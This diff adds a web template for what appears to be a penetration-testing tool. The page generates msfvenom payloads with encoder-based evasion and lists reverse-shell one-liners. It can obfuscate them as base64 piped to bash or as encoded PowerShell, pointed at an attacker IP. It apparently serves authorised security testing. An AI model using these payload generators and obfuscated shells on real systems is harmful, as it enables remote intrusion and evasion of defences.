@@ -1,0 +1,205 @@
+{% extends "base.html" %}
+{% block title %} — Payloads{% endblock %}
+
+{% block content %}
+<header class="page-head">
+  <h1>Payloads</h1>
+  <p class="muted">Generate an msfvenom payload (LHOST from your engagement), saved to the loot dir — serve it via
+    <a href="{{ url_for('files.files') }}">File Transfer</a> and catch it with the listener shown below.</p>
+</header>
+
+<div class="recon-grid">
+  <form id="pl-form" class="form recon-form">
+    <fieldset>
+      <legend>Payload</legend>
+      <label>Payload
+        <select name="payload" id="pl-payload">
+          {% for g in groups %}
+          <optgroup label="{{ g }}">
+            {% for p in payloads if p.group == g %}<option value="{{ p.value }}" data-fmt="{{ p.fmt }}">{{ p.value }}</option>{% endfor %}
+          </optgroup>
+          {% endfor %}
+        </select>
+      </label>
+      <div class="field-grid">
+        <label>LHOST <input type="text" name="lhost" value="{{ eng.attacker_ip }}" placeholder="10.10.14.7"></label>
+        <label>LPORT <input type="text" name="lport" value="4444"></label>
+      </div>
+    </fieldset>
+
+    <fieldset>
+      <legend>Output</legend>
+      <div class="field-grid">
+        <label>Format
+          <select name="format" id="pl-format">{% for f in formats %}<option value="{{ f }}" {{ 'selected' if f == 'exe' }}>{{ f }}</option>{% endfor %}</select>
+        </label>
+        <label>Filename <input type="text" name="outfile" placeholder="(auto)"></label>
+      </div>
+    </fieldset>
+
+    <fieldset>
+      <legend>Evasion &amp; extras</legend>
+      <div class="field-grid">
+        <label>Encoder
+          <select name="encoder">{% for e in encoders %}<option value="{{ e.value }}">{{ e.label }}</option>{% endfor %}</select>
+        </label>
+        <label>Iterations <input type="text" name="iterations" placeholder="3"></label>
+        <label>Bad chars <input type="text" name="badchars" placeholder="\x00\x0a\x0d"></label>
+      </div>
+      <label>Extra flags <input type="text" name="extra" placeholder="--smallest  /  EXITFUNC=thread"></label>
+    </fieldset>
+  </form>
+
+  <div class="recon-side">
+    <div class="preview-box">
+      <div class="preview-head"><span>msfvenom command</span></div>
+      <pre id="pl-preview" class="cmd-preview"></pre>
+      <div id="pl-warnings" class="warnings"></div>
+      <div class="preview-actions">
+        <button id="run-btn" class="btn primary">Generate</button>
+        <button id="kill-btn" class="btn" disabled>Stop</button>
+        <button id="copy-btn" class="btn ghost">Copy</button>
+      </div>
+    </div>
+
+    <div class="preview-box" style="margin-top:12px">
+      <div class="preview-head"><span id="listener-label">Listener</span><button type="button" class="btn ghost xs" id="copy-listen">copy</button></div>
+      <pre id="pl-listener" class="cmd-preview"></pre>
+    </div>
+  </div>
+</div>
+
+<div class="terminal" id="terminal">
+  <div class="term-head">
+    <span class="dot red"></span><span class="dot amber"></span><span class="dot green"></span>
+    <span data-term-status class="term-status status-idle">idle</span>
+    <span data-term-cmd class="term-cmd"></span>
+  </div>
+  <pre data-term-output class="term-output"></pre>
+</div>
+
+<header class="page-head" style="margin-top:28px"><h1>Reverse shell one-liners</h1>
+  <p class="muted">Copy-paste reverse shells across languages — set your IP / port / shell and grab one.</p></header>
+<div class="pv-vars">
+  <span class="muted small">IP</span><input id="rs-ip" class="port-in wide" value="{{ eng.attacker_ip }}" placeholder="10.10.14.7">
+  <span class="muted small">port</span><input id="rs-port" class="port-in" value="4444">
+  <span class="muted small">shell</span>
+  <select id="rs-shell" class="port-in wide">
+    <option>/bin/bash</option><option>/bin/sh</option><option>bash</option><option>sh</option>
+    <option>/bin/zsh</option><option>cmd</option><option>powershell</option>
+  </select>
+  <span class="muted small">obfuscate</span>
+  <select id="rs-encode" class="port-in wide">
+    <option value="none">None</option>
+    <option value="b64">Base64</option>
+    <option value="url">URL-encode</option>
+    <option value="durl">Double URL</option>
+  </select>
+</div>
+
+{% for g in rev_groups %}
+<div class="pv-group">
+  <h3 class="sec-h">{{ g }}</h3>
+  {% for r in rev_shells if r.g == g %}
+  <div class="pl-row"><span class="pl-label">{{ r.label }}</span><code class="pl-cmd rs-cmd" data-tpl="{{ r.cmd }}">{{ r.cmd }}</code><button type="button" class="btn ghost xs rs-copy">copy</button></div>
+  {% endfor %}
+</div>
+{% endfor %}
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/zeroterm.js') }}"></script>
+<script>
+const form = document.getElementById('pl-form');
+const preview = document.getElementById('pl-preview');
+const listenerEl = document.getElementById('pl-listener');
+const listenerLabel = document.getElementById('listener-label');
+const warnings = document.getElementById('pl-warnings');
+const runBtn = document.getElementById('run-btn');
+const killBtn = document.getElementById('kill-btn');
+const LOOT = {{ (eng.output_dir or '')|tojson }};
+const term = ZeroTerm.attach(document.getElementById('terminal'));
+let currentCommand = '', running = false;
+
+// switch the format select to the payload's default when the payload changes
+document.getElementById('pl-payload').addEventListener('change', (e) => {
+  const fmt = e.target.selectedOptions[0].dataset.fmt;
+  if (fmt) document.getElementById('pl-format').value = fmt;
+  refresh();
+});
+
+function params() {
+  const fd = new FormData(form), o = {};
+  for (const [k, v] of fd.entries()) o[k] = v;
+  return o;
+}
+
+let debounce = null;
+function refresh() {
+  clearTimeout(debounce);
+  debounce = setTimeout(async () => {
+    try {
+      const d = await (await fetch('{{ url_for("payloads.payloads_build") }}', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(params())
+      })).json();
+      currentCommand = d.command || '';
+      preview.textContent = currentCommand;
+      listenerEl.textContent = d.listener || '';
+      listenerLabel.textContent = d.needs_handler ? 'Listener — Metasploit handler' : 'Listener';
+      runBtn.disabled = running;
+      warnings.innerHTML = '';
+      (d.warnings || []).forEach(w => { const e = document.createElement('div'); e.className = 'warn'; e.textContent = '⚠ ' + w; warnings.appendChild(e); });
+    } catch (e) {}
+  }, 150);
+}
+form.addEventListener('input', refresh);
+form.addEventListener('change', refresh);
+
+term.onState(s => { running = (s === 'running'); runBtn.disabled = running; killBtn.disabled = !running; });
+runBtn.addEventListener('click', () => { if (currentCommand && !running) term.run(currentCommand, LOOT); });
+killBtn.addEventListener('click', () => term.kill());
+document.getElementById('copy-btn').addEventListener('click', () => navigator.clipboard?.writeText(currentCommand));
+document.getElementById('copy-listen').addEventListener('click', () => navigator.clipboard?.writeText(listenerEl.textContent));
+
+refresh();
+
+// reverse-shell one-liners
+function b64utf16le(s) { // for PowerShell -EncodedCommand
+  const bytes = [];
+  for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); bytes.push(c & 0xff, (c >> 8) & 0xff); }
+  let bin = ''; bytes.forEach(b => bin += String.fromCharCode(b));
+  return btoa(bin);
+}
+function obfuscate(cmd, method) {
+  try {
+    if (method === 'url') return encodeURIComponent(cmd);
+    if (method === 'durl') return encodeURIComponent(encodeURIComponent(cmd));
+    if (method === 'b64') {
+      if (/^(powershell|pwsh|cmd)/i.test(cmd)) {
+        const m = cmd.match(/^powershell\s+-nop\s+-c\s+"([\s\S]*)"\s*$/i);
+        return 'powershell -e ' + b64utf16le(m ? m[1] : cmd);
+      }
+      return 'echo ' + btoa(cmd) + ' | base64 -d | bash';
+    }
+  } catch (e) {}
+  return cmd;
+}
+function refreshRev() {
+  const ip = document.getElementById('rs-ip').value || 'ATTACKER_IP';
+  const port = document.getElementById('rs-port').value || 'PORT';
+  const shell = document.getElementById('rs-shell').value || '/bin/bash';
+  const enc = document.getElementById('rs-encode').value;
+  document.querySelectorAll('.rs-cmd').forEach(c => {
+    const sub = c.dataset.tpl.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port).replace(/\{shell\}/g, shell);
+    c.textContent = obfuscate(sub, enc);
+  });
+}
+['rs-ip', 'rs-port', 'rs-shell', 'rs-encode'].forEach(id => document.getElementById(id).addEventListener('input', refreshRev));
+document.getElementById('rs-encode').addEventListener('change', refreshRev);
+document.querySelectorAll('.rs-copy').forEach(b => b.addEventListener('click', () => {
+  navigator.clipboard?.writeText(b.previousElementSibling.textContent);
+  b.textContent = 'copied'; setTimeout(() => b.textContent = 'copy', 1000);
+}));
+refreshRev();
+</script>
+{% endblock %}
